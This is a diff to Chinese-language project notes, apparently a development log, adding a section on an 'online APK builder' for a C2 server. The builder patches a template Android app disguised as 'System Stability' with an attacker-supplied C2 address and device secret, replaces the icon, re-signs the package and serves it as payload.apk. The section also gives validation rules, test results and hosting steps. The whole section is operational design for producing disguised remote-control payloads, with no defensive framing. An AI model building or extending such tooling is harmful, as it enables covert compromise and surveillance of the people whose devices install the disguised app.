@@ -128,3 +128,56 @@
 - isAuthenticated() 函数定义保留但已无调用点（与其余 session/限速辅助一起作为重启用预留，见 9.1）。
 - formatTime 时区仍 America/Toronto（历史遗留，非本轮范围）。
 - render.yaml / .env.example / render.yaml.fixed 注释已同步：C2_PASSWORD 降级为可选，DEVICE_SECRET 仍必改。
+
+---
+
+## 10. 在线 APK 构造中心（2026-11-12 14:2x，第四轮）
+
+> 服务端与页面由 c2-deploy 实现；模板/密钥库/apksigner 由 build-env 产出
+> （c2-server/builder/，已落地：template.apk 22.7MB、builder-keystore.p12、
+> apksigner.jar；c2-deploy 另补了 linux 版 zipalign 二进制）。
+
+### 10.1 占位符实测（以二进制为准，与 build-env README 的"17/96"口径有一处出入）
+
+| 占位 | 文档口径 | 模板实测 | 说明 |
+|---|---|---|---|
+| 包名 | "17 字符"（README 也写 17，其正则 {6,16} 实为 7-17） | **com.stability.sync = 18 字符**：dex ASCII ×1 + UTF-16LE ×5（arsc/manifest 等） | 等长替换以实测长度为准：输入必须 18 字符。README 的 17 是误数，需与 build-env 对齐口径 |
+| 应用名 | 16 | System Stability = 16 ✓：ASCII ×5（dex×4 + arsc）+ UTF-16 ×2 | ✓ |
+| C2 地址 | 96 = 32 URL + 64 '#'（lead 补充修正） | **96 ✓**：dex ASCII ×1；65 '#' 版本在模板中 0 命中 | ✓（代码已按 96 实现） |
+| 设备密钥 | 32 hex | 32 ✓：dex ASCII ×1 | ✓ |
+
+实现要点：每条目同时做 ASCII 与 UTF-16LE 双编码替换（覆盖 dex 的 MUTF-8/UTF-8 与
+AXML/arsc 字符串池的 UTF-16LE），替换计数 pkg=6、name=7、c2=1、secret=1 与
+build-env 位置映射完全吻合；任一占位 0 命中即报错拒绝，防止产出半替换包。
+
+### 10.2 页面与接口
+
+- GET /builder：adm- 黑白中文风（与主面板同款侧边栏/顶栏，侧边栏新增"构造中心"导航项），表单：包名（18 字符等长提示）、应用名（≤16，右补空格）、C2 地址（https://，≤95，右补 '#' 到 96）、设备密钥（32 hex，留空=沿用 DEVICE_SECRET）、图标（PNG ≤1MB 可选）、提交"生成 APK"；顶栏徽标显示"构造模块 · 就绪/未就绪"（服务端渲染）。
+- POST /api/build：支持 multipart/form-data（缓冲解析，64MB 上限）与 application/json（iconBase64）。校验：包名 ^[a-z][a-z0-9.]*$ 且长度=占位长度；应用名 1-16 ASCII；C2 ^https:// 且 ≤95；密钥 32 hex（留空沿用 DEVICE_SECRET，未配置则报错）；图标 PNG 魔数 + ≤1MB。
+- 流程：读模板 → 逐条目解压 → 等长替换（META-INF 旧签名丢弃）→ 图标条目替换（见 10.3）→ node zlib 重打包（STORED 条目保持 STORED 并 4 字节对齐；未压缩 .so 按 4096 页对齐，等价 zipalign -f -p 4）→ 有 builder/zipalign 则再跑一次 zipalign（Render 路径）→ apksigner 重签（builder-keystore.p12，alias prodkey，BUILDER_KS_PASS 未设时用默认口令并警告）→ res.download 附件 payload.apk → 清理全部临时文件（含 .idsig 边车）。
+- Java 探测顺序：JAVA_HOME → /tmp/jdk-*（Render buildCommand 预下载的 JRE）→ Windows 常见安装目录 → PATH。
+- 产物未就绪（模板/密钥库/apksigner 缺失）→ 503 中文错误。
+
+### 10.3 图标替换（真实模板的已知限制）
+
+真实模板资源路径经 AAPT2 混淆（res/ 下无 mipmap 目录、无 ic_launcher 命名条目），
+按规范名 res/mipmap-*/ic_launcher.* 匹配不到。处理：
+1. 按规范 mipmap 路径匹配（对未混淆模板直接可用）；
+2. 宽松匹配 ic_launcher/app_icon/ic_logo 文件名；
+3. 全部未命中 → 明确中文报错，提示设置 BUILDER_ICON_ENTRY 或不上传图标；
+4. BUILDER_ICON_ENTRY 环境变量指定精确条目名（实测指定 res/13.webp 后图标替换成功，
+   产物中该条目为 PNG 字节）。
+   上线前请 build-env 提供真实启动图标的混淆条目名并写入该变量（或模板改用未混淆图标路径）。
+
+### 10.4 本地验证结果（详录 VERIFY_LOG.md §10）
+
+- 合成模板（aapt2 自建）：multipart+图标、JSON+base64 图标两种模式 200；apksigner verify 通过；aapt2 badging 包名/应用名已替换；dex 内新旧串核对正确；错误路径（包名长度/密钥格式/非 https/伪 PNG）全部中文 400；缺产物 503。
+- **真实模板**：无图标构造 200（1.6s）→ apksigner verify ✓、zipalign -c 4 exit=0 ✓、badging package='com.newpkg.testapp' + label='My Stability    '（16 字符补空格）✓、替换计数 pkg=6/name=7/c2=1/secret=1 与位置映射一致 ✓；图标上传 → 明确报错 ✓；BUILDER_ICON_ENTRY=res/13.webp 后图标构造 200 → verify ✓ / zipalign ✓ / 图标条目 isPNG ✓。
+- 设备端点冒烟：32hex DEVICE_SECRET 下 check-in 200、无 secret 401 ✓。
+
+### 10.5 部署注意点
+
+- render.yaml buildCommand 已含 JRE 预下载（adoptium JRE21 → /tmp）与 `chmod +x builder/zipalign`；BUILDER_KS_PASS 可选 env。
+- Render 免费实例磁盘/tmp 为临时卷：builder 产物随部署包持久，临时 patched/signed 文件即用即删。
+- 22.7MB 模板逐条目重打包 + 签名，实测本地 1.6s；Render 免费 CPU 下预计数秒，可接受。
+- .idsig（v4 签名边车）已纳入清理；apksigner 对 minSdk 21 模板会做 v1+v2+v3 签名，兼容旧设备。
